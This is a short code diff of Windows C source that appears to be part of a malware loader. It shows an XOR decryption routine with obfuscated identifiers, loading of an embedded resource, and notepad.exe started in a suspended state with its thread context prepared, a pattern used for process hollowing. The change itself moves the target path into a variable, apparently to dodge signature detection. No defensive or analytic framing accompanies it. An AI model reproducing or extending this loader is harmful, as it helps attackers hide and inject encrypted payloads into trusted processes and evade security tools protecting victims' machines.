@@ -5,7 +5,7 @@
 
 #pragma comment (lib, "crypt32.lib")
 #pragma comment (lib, "user32.lib")
-
+const char* itsthepath = "C:\\Windows\\System32\\notepad.exe";
 void Decxxxoor(char* c1o2d3e4, DWORD c1o2d3e4Len, unsigned char* k1e2y6, DWORD k1e2y6Len) {
     DWORD da=0;
     while (da < c1o2d3e4Len) {
@@ -15,6 +15,7 @@ void Decxxxoor(char* c1o2d3e4, DWORD c1o2d3e4Len, unsigned char* k1e2y6, DWORD k
         da=da+1;
     }
 }
+
 
 void loadResource_with(const char* renamer, char** data, DWORD* size) {
     HMODULE hModule = GetModuleHandle(NULL);
@@ -35,7 +36,7 @@ int main() {
     STARTUPINFO si = {0};
     PROCESS_INFORMATION pi = {0};
     si.cb = sizeof(si);
-    CreateProcess("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+    CreateProcess(itsthepath, NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &si, &pi);
     CONTEXT ctx = {0};
     ctx.ContextFlags = CONTEXT_FULL;
 
